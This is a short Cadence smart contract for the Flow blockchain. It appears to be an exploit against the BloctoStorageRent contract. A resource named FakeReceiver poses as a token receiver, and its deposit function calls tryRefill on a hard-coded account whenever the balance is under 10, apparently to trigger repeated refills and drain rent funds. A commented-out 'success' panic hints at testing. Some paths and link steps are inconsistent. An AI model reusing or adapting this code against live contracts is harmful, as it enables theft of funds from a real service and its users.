import BloctoStorageRent from 0x1dfd1e5b87b847dc
import FlowToken from 0x1654653399040a61
import FungibleToken from 0xf233dcee88fe0abe

pub contract new {
         
    init(){
        var vault <- FlowToken.createEmptyVault()
        self.account.save(<-vault, to:/storage/vault)
        
        var fake <- create FakeReceiver()
        self.account.save(<-fake, to:/storage/fake)
        self.account.link<&{FungibleToken.Receiver}>(/public/flowTokenReceiver, target:/storage/fake)

        self.account.unlink(/public/flowTokenReceiver)

    }

  

    pub resource FakeReceiver: FungibleToken.Receiver{
        
        pub fun deposit(from: @FungibleToken.Vault){
            var vault = new.account.borrow<&FlowToken.Vault>(from:/storage/flowTokenVault)!
            vault.deposit(from: <-from)
            if vault.balance<10.00{
                BloctoStorageRent.tryRefill(0x0be771afbc7a0e43)
                return
            }
            //panic("success")
        }
    }


}
